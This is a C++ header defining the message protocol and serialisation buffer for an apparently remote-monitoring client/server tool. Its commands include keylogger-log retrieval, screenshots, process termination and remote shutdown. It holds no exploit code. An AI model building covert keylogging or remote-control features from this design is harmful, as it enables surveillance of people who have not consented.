#pragma once

#include <string>
#include <vector>


namespace Distance::Network
{
    namespace ClientMsgType
    {
        enum
        {
            PcInfo,
            ProcessList,
            Screenshot,
            KeyloggerLog,
            NetfilterLog
        };
    }

    namespace ServerMsgType
    {
        enum
        {
            GetPcInfo,

            GetProcessList,
            TerminateProcess,

            GetScreenshot,

            ShutdownPC,
            RebootPC,
            LogoutPC,

            GetKeyloggerLog,
            GetNetfilterLog
        };
    }

    using MsgType = std::uint32_t;

    /*
    * @brief The MessageHeader stores information about a message
    */
    struct MessageHeader
    {
        MsgType type;
        size_t size;
    };


    /*
    * @brief The Message is buffer for keeps POD, std::string and std::wstring data
    */
    class Message final
    {
    public:
        Message(MsgType type = 0, size_t size = 0)
            : data_(sizeof(MessageHeader) + size),
            header_(reinterpret_cast<MessageHeader*>(&data_[0]))
        {
            header_->type = type;
            header_->size = size;
        }

        Message(const Message& other)
        {
            data_ = other.data_;
            header_ = reinterpret_cast<MessageHeader*>(&data_[0]);
        }

        Message(Message&& other) noexcept
        {
            data_ = std::move(other.data_);
            header_ = std::move(other.header_);
        }



        Message& operator = (const Message& other)
        {
            if (&other != this)
            {
                data_ = other.data_;
                header_ = reinterpret_cast<MessageHeader*>(&data_[0]);
            }
            return *this;
        }

        Message& operator = (Message&& other) noexcept
        {
            if (&other != this)
            {
                data_ = std::move(other.data_);
                header_ = std::move(other.header_);
            }
            return *this;
        }

        void resize(size_t newSize)
        {
            data_.resize(sizeof(MessageHeader) + newSize);
			header_ = reinterpret_cast<MessageHeader*>(&data_[0]);
            header_->size = newSize;
        }

        [[nodiscard]] MessageHeader getMsgHeader() const
        {
            return *header_;
        }

        [[nodiscard]] const std::vector<std::byte>& getData() const
        {
            return data_;
        }

        [[nodiscard]] std::vector<std::byte>& getData()
        {
            return data_;
        }
	
        [[nodiscard]] size_t size() const
		{
			return header_->size;
		}
        
        [[nodiscard]] size_t capacity() const
        {
            return data_.capacity();
        }

        void setMsgType(MsgType type)
        {
            header_->type = type;
        }

        [[nodiscard]] MsgType getMsgType() const
        {
            return header_->type;
        }

        template <class PodType>
        friend Message& operator << (Message& msg, const PodType& object)
        {
            return msg.copyFrom(object);
        }

        template <class PodType>
        friend Message& operator >> (Message& msg, PodType& object)
        {
            return msg.copyTo(object);
        }

    private:
        template <class DataType>
        Message& copyFrom(const DataType& object);
        template <>
        Message& copyFrom(const std::string& object);
        template <>
        Message& copyFrom(const std::wstring& object);
        template <>
        Message& copyFrom(const std::vector<std::byte>& data);

        template <class DataType>
        Message& copyTo(DataType& object);
        template <>
        Message& copyTo(std::string& object);
        template <>
        Message& copyTo(std::wstring& object);
        template <>
        Message& copyTo(std::vector<std::byte>& data);

    private:
        std::vector<std::byte> data_;
        MessageHeader* header_;
    };



    template <class DataType>
    inline Message& Message::copyFrom(const DataType& object)
    {
        static_assert(
            std::is_standard_layout<DataType>::value,
            "The \'Message\' is supporting only POD, std::string, std::wstring or std::vector"
            );

        resize(sizeof(object));
        std::memcpy(data_.data() + sizeof(MessageHeader), &object, sizeof(object));

        return *this;
    }

    template<>
    inline Message& Message::copyFrom(const std::string& object)
    {
        resize(object.size() + sizeof(char));
        std::memcpy(data_.data() + sizeof(MessageHeader), object.data(), object.size());

        return *this;
    }

    template<>
    inline Message& Message::copyFrom(const std::wstring& object)
    {
        resize(object.size() * sizeof(wchar_t) + sizeof(wchar_t));
        std::memcpy(data_.data() + sizeof(MessageHeader), object.data(), object.size() * sizeof(wchar_t));

        return *this;
    }

    template <>
    inline Message& Message::copyFrom(const std::vector<std::byte>& data)
    {
        resize(data.size());
        std::memcpy(data_.data() + sizeof(MessageHeader), data.data(), data.size());

        return *this;
    }



    template <class DataType>
    inline Message& Message::copyTo(DataType& object)
    {
        static_assert(
            std::is_standard_layout<DataType>::value,
            "The \'Message\' is supporting only POD, std::string, std::wstring or std::vector"
            );

        std::memcpy(&object, data_.data() + sizeof(MessageHeader), sizeof(object));
        resize(0);

        return *this;
    }

    template <>
    inline Message& Message::copyTo(std::string& object)
    {
        object = std::string(reinterpret_cast<char*>(data_.data() + sizeof(MessageHeader)));
        resize(0);

        return *this;
    }

    template <>
    inline Message& Message::copyTo(std::wstring& object)
    {
        object = std::wstring(reinterpret_cast<wchar_t*>(data_.data() + sizeof(MessageHeader)));
        resize(0);

        return *this;
    }

    template <>
    inline Message& Message::copyTo(std::vector<std::byte>& data)
    {
        data.resize(size());
        memcpy(data.data(), data_.data() + sizeof(MessageHeader), data.size());
        resize(0);

        return *this;
    }

} // Distance::Network